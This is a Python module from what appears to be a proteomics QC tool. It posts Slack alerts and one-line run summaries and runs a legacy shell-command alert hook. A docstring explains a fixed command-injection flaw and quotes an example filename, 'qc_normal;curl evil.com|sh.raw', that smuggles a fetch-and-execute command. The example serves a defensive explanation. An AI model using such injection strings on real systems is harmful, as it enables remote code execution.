"""Alert hooks — notifications for QC failures.

Supports:
- Shell command hooks in instruments.yml (legacy)
- Slack webhooks (preferred)

Slack config, in precedence order (see ``stan.notify.slack_webhook``):

    $STAN_SLACK_WEBHOOK
    slack_webhook_url in ~/STAN/community.yml
    ~/.stan/slack_webhook

    alerts:
      on_qc_fail: true       # alert when a run fails gates
      on_qc_warn: false      # alert on warnings too

This module owns the *QC gate* path only — one message per failing run,
fired inline with acquisition. Instrument faults (over-pressure, clogs,
Compass errors) are `stan.reports.instrument_watch`, which is scheduled and
deduplicated. Both post through `stan.notify` so there is one webhook
resolution and one place a secret could leak from.
"""

from __future__ import annotations

import logging
import os
import subprocess
import threading

from stan.gating.evaluator import GateDecision, GateResult

logger = logging.getLogger(__name__)


def _get_slack_webhook() -> str | None:
    """Load the Slack webhook URL. See ``stan.notify.slack_webhook``."""
    from stan.notify import slack_webhook

    return slack_webhook()


def _post_to_slack_async(webhook: str, payload: dict) -> None:
    """Fire-and-forget POST to a Slack webhook.

    Async here, unlike the scheduled watcher, because this runs inline with
    acquisition: a QC alert must never make the watcher wait on Slack. The
    tradeoff is that success is unobservable, which is fine when the same
    condition will be re-evaluated on the next run.
    """
    from stan.notify import post_slack

    thread = threading.Thread(
        target=lambda: post_slack(payload, webhook),
        daemon=True, name="stan-slack-alert",
    )
    thread.start()


def send_slack_alert(
    instrument: str,
    run_name: str,
    decision: GateDecision,
    ips_score: int | None = None,
) -> None:
    """Send a Slack alert for a QC gate result."""
    webhook = _get_slack_webhook()
    if not webhook:
        return

    _emoji = {":x:": "FAIL", ":warning:": "WARN"}.get(decision.result.value, "")
    icon = ":x:" if decision.result == GateResult.FAIL else ":warning:"
    lines = [
        f"{icon} *QC {decision.result.value.upper()} on {instrument}*",
        f"*Run:* `{run_name}`",
    ]
    if ips_score is not None:
        lines.append(f"*IPS:* {ips_score}/100")
    if decision.failed_gates:
        lines.append(f"*Failed gates:* {', '.join(decision.failed_gates[:5])}")
    if decision.diagnosis:
        lines.append(f"*Diagnosis:* {decision.diagnosis[:300]}")

    payload = {
        "text": f"QC {decision.result.value.upper()} on {instrument}: {run_name}",
        "blocks": [
            {"type": "section", "text": {"type": "mrkdwn", "text": "\n".join(lines)}},
        ],
    }
    _post_to_slack_async(webhook, payload)


#: Gate metric names -> what to call them in a one-line summary. Anything not
#: listed falls back to the metric name with underscores turned into spaces.
_GATE_LABELS = {
    "pct_delta_mass_lt5ppm": "mass calibration",
    "n_precursors": "precursors",
    "n_psms": "PSMs",
    "n_peptides": "peptides",
    "n_proteins": "proteins",
    "ips_score": "IPS",
}

#: PEG is only worth a line when it is actually a problem. `classify_peg_score`
#: calls 20-50 "trace", which is the normal background of shared plasticware and
#: would fire on most runs; moderate (>=50) is where sample prep needs attention.
_PEG_REPORT_FROM = 50.0

_QC_SUMMARY_ENV = "STAN_SLACK_QC_SUMMARY"

_RESULT_ICON = {"pass": ":large_green_circle:",
                "warn": ":large_yellow_circle:",
                "fail": ":red_circle:"}

#: IPS bands, copied from IpsBadge in dashboard/public/index.html so the Slack
#: line and the front-page gauges cannot disagree about the same run.
_IPS_GREEN = 80
_IPS_YELLOW = 60


def _icon_for(metrics: dict, decision: GateDecision | None) -> str:
    """Colour off IPS, the cohort-calibrated score the front-page gauges use.

    Deliberately NOT off ``decision.result``. Gate thresholds live in a
    thresholds.yml that no deployment actually has, so ``evaluate_gates``
    short-circuits to PASS for every run -- all 4,540 rows in the runs table
    are "pass", including 398 that identified nothing. Keying the icon on that
    would paint every line green forever.

    IPS is built from the lab's own accumulated baselines (see
    ``IPS_REFERENCES_DDA``) and is the number the gauges already show, so it is
    both meaningful and consistent with the dashboard. The gate decision is
    kept only as a fallback for runs with no IPS at all.
    """
    ips = metrics.get("ips_score")
    if ips is not None:
        if ips >= _IPS_GREEN:
            return ":large_green_circle:"
        return ":large_yellow_circle:" if ips >= _IPS_YELLOW else ":red_circle:"
    return _RESULT_ICON.get(
        decision.result.value.lower() if decision else "", ":white_circle:")


def qc_summary_enabled() -> bool:
    """Per-run summaries on unless STAN_SLACK_QC_SUMMARY is set to a false value."""
    val = os.environ.get(_QC_SUMMARY_ENV)
    if val is None:
        return True
    return val.strip().lower() not in ("0", "false", "no", "off", "")


def format_qc_summary(instrument: str, run_name: str, metrics: dict,
                      decision: GateDecision | None = None) -> str:
    """One line: what was identified, and anything that flagged.

    Deliberately reads the FLAGS OFF THE GATE DECISION rather than
    re-comparing metrics to thresholds here. Two places deciding what counts
    as out of spec drift apart, and then Slack and the dashboard disagree
    about the same run.

    PEG is the exception, because it is not a gate: it is computed after
    ``insert_run`` and carried in ``metrics`` by the caller.
    """
    parts = []
    n_prec = metrics.get("n_precursors")
    n_psms = metrics.get("n_psms")
    if n_prec:
        parts.append(f"{int(n_prec):,} precursors")
    elif n_psms:
        parts.append(f"{int(n_psms):,} PSMs")
    if metrics.get("n_proteins"):
        parts.append(f"{int(metrics['n_proteins']):,} proteins")
    if metrics.get("ips_score") is not None:
        parts.append(f"IPS {int(metrics['ips_score'])}")

    flags = []
    # An explicit zero, not a missing key: runs that never went through a
    # search have no such key and must not be labelled dead.
    ids = metrics.get("n_precursors", metrics.get("n_psms"))
    if ids is not None and not ids:
        flags.append("no identifications")

    peg = metrics.get("peg_score")
    if peg is not None and peg >= _PEG_REPORT_FROM:
        try:
            from stan.metrics.peg import classify_peg_score
            # Pass the ion count: the classifier needs it to avoid calling a
            # two-ion coincidence "moderate", which is why it takes the argument.
            label = classify_peg_score(
                peg, metrics.get("peg_n_ions_detected", 999) or 999)
        except Exception:  # noqa: BLE001 - a label is not worth failing over
            label = "high"
        flags.append(f"PEG {label} ({peg:.0f})")

    if decision is not None:
        for gate in list(decision.failed_gates) + list(decision.warned_gates):
            label = _GATE_LABELS.get(gate, gate.replace("_", " "))
            if gate == "pct_delta_mass_lt5ppm":
                val = metrics.get(gate)
                if val is not None:
                    label = f"{label} ({val:.0f}% <5 ppm)"
            flags.append(label)

    icon = _icon_for(metrics, decision)
    line = f"{icon} *{instrument}* `{run_name}`"
    if parts:
        line += " — " + " \u00b7 ".join(parts)
    if flags:
        line += "  :warning: " + ", ".join(flags)
    return line


def send_qc_summary(instrument: str, run_name: str, metrics: dict,
                    decision: GateDecision | None = None) -> bool:
    """Post the one-line QC summary. No-ops without a webhook, never raises.

    CALL THIS AFTER PEG IS COMPUTED. On the Hive path PEG and window drift run
    *after* ``insert_run`` (see ``hive_process`` module docs), so a call at
    gate-evaluation time would report every run as PEG-free.
    """
    if not qc_summary_enabled():
        return False
    webhook = _get_slack_webhook()
    if not webhook:
        return False
    try:
        text = format_qc_summary(instrument, run_name, metrics, decision)
    except Exception:  # noqa: BLE001 - a QC run must never fail over Slack
        logger.debug("QC summary formatting failed", exc_info=True)
        return False
    _post_to_slack_async(webhook, {
        "text": text,
        "blocks": [{"type": "section", "text": {"type": "mrkdwn", "text": text}}],
    })
    return True


def test_slack_alert(message: str = "STAN alert test") -> bool:
    """Send a test message to verify the Slack webhook is working."""
    webhook = _get_slack_webhook()
    if not webhook:
        return False

    payload = {
        "text": message,
        "blocks": [
            {
                "type": "section",
                "text": {
                    "type": "mrkdwn",
                    "text": f":white_check_mark: *{message}*\nSTAN Slack alerts are configured correctly.",
                },
            }
        ],
    }
    _post_to_slack_async(webhook, payload)
    return True


def send_alert(
    decision: GateDecision,
    instrument_name: str,
    run_name: str,
    instrument_config: dict,
    ips_score: int | None = None,
) -> None:
    """Send alerts based on QC gate result.

    Sends to Slack (if configured) and/or runs the shell command hook.

    instrument_config may contain:
        alert_on_fail: true/false (default true)
        alert_on_warn: true/false (default false)
        alert_command: shell command template with {instrument}, {run}, {result}, {diagnosis}
    """
    # Load global alert settings from community.yml
    try:
        from stan.config import load_community
        comm = load_community()
        global_alerts = comm.get("alerts", {})
    except Exception:
        global_alerts = {}

    alert_on_fail = instrument_config.get("alert_on_fail", global_alerts.get("on_qc_fail", True))
    alert_on_warn = instrument_config.get("alert_on_warn", global_alerts.get("on_qc_warn", False))

    should_alert = (
        (decision.result == GateResult.FAIL and alert_on_fail)
        or (decision.result == GateResult.WARN and alert_on_warn)
    )

    if not should_alert:
        return

    # Slack alert (primary)
    send_slack_alert(instrument_name, run_name, decision, ips_score=ips_score)

    # Shell command hook (legacy)
    alert_cmd = instrument_config.get("alert_command", "")
    if alert_cmd:
        _run_alert_command(alert_cmd, instrument_name, run_name, decision)


def _run_alert_command(
    command_template: str,
    instrument: str,
    run_name: str,
    decision: GateDecision,
) -> None:
    """Execute an alert command with template substitution.

    v0.2.307: substitution is now done AFTER shlex.split so
    operator-controlled values (raw filename, diagnosis text) land
    inside individual argv items and can't break out into shell
    metacharacters. Pre-fix this called subprocess.run(shell=True),
    which gave any operator who could name a raw file
    `qc_normal;curl evil.com|sh.raw` arbitrary RCE on the
    instrument PC the next time alerts fired. Same fix shape as
    other dashboard / control entry points: parse the template
    once into argv, then substitute into the individual tokens.
    """
    import shlex

    try:
        argv = shlex.split(command_template)
    except ValueError as e:
        logger.warning(
            "alert_command template is unparseable (%s); skipping for %s",
            e, run_name,
        )
        return
    if not argv:
        return

    subs = {
        "{instrument}": instrument,
        "{run}": run_name,
        "{result}": decision.result.value,
        "{diagnosis}": decision.diagnosis,
        "{failed_gates}": ", ".join(decision.failed_gates),
    }

    def _sub(token: str) -> str:
        for k, v in subs.items():
            token = token.replace(k, v)
        return token

    argv = [_sub(a) for a in argv]

    try:
        subprocess.run(
            argv,
            shell=False,  # critical — see docstring
            check=False,
            capture_output=True,
            text=True,
            timeout=30,
        )
        logger.info("Alert command executed for %s: %s", run_name, decision.result.value)
    except subprocess.TimeoutExpired:
        logger.warning("Alert command timed out for %s", run_name)
    except FileNotFoundError:
        logger.warning("Alert command binary not found: %s", argv[0])
    except Exception:
        logger.exception("Alert command failed for %s", run_name)
